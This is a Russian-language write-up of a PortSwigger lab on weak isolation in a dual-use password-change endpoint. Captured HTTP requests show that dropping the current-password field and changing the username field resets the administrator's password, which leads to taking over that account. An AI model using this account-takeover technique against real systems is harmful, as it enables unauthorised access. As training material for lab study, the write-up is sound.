---
title: "Weak isolation on dual-use endpoint"
date: 2025-10-16
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint"
classes: wide
---

Для прохождения нужно получить доступ к аккаунту администратора и удалить пользователя `carlos`. Для входа в учетную запись есть креды `wiener`:`peter`.

```
https://0a1300b203e960ca83f4d27f006100a8.web-security-academy.net/
```

# Solution

Даны креды, поэтому стоит зайти в учетную запись. Воу. Как много возможностей в лк:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_weak-isolation-on-dual-use-endpoint/1.png){: height="200" .align-center}

Форма для изменения пароля выглядит любопытно. Особенно нравится возможность ввести имя пользователя самостоятельно. Попробую изменит пароль:

```http
POST /my-account/change-password HTTP/2
Host: 0a1300b203e960ca83f4d27f006100a8.web-security-academy.net
Cookie: session=fQlSQMfUTvDilyDbm34B1xtCvaBuCesA
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1300b203e960ca83f4d27f006100a8.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Origin: https://0a1300b203e960ca83f4d27f006100a8.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=kf1PryYuLmGb1EnKO7Z5MdvbjOlXG50c&username=wiener&current-password=peter&new-password-1=1&new-password-2=1
```

Попроюбую изменить пароль без поля `current-password`:

```http
POST /my-account/change-password HTTP/2
Host: 0a1300b203e960ca83f4d27f006100a8.web-security-academy.net
Cookie: session=fQlSQMfUTvDilyDbm34B1xtCvaBuCesA
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1300b203e960ca83f4d27f006100a8.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: https://0a1300b203e960ca83f4d27f006100a8.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=kf1PryYuLmGb1EnKO7Z5MdvbjOlXG50c&username=wiener&new-password-1=2&new-password-2=2
```

И это сработало:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_weak-isolation-on-dual-use-endpoint/2.png){: height="200" .align-center}

Попробую изменить пароль другому пользователю. Предположим, что у админа логин `administrator`:

> За это время у меня успела протухнуть сессия, поэтому пришлось получить новый запрос.

```http
POST /my-account/change-password HTTP/2
Host: 0a1300b203e960ca83f4d27f006100a8.web-security-academy.net
Cookie: session=9IGmLo32t4tMNQy9QWa8OSXwWpmZwvFK
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1300b203e960ca83f4d27f006100a8.web-security-academy.net/my-account?id=wiener
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: https://0a1300b203e960ca83f4d27f006100a8.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=Y8imk7edOIAMSwzbjVVoNBOekHuepPbX&username=administrator&new-password-1=2&new-password-2=2
```

Пришел положительный ответ:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2627

<!DOCTYPE html>
...
```

Протестирую:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_weak-isolation-on-dual-use-endpoint/3.png){: height="200" .align-center}

Удалим `carlos`. Решено)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_blv/IMG_weak-isolation-on-dual-use-endpoint/4.png){: height="200" .align-center}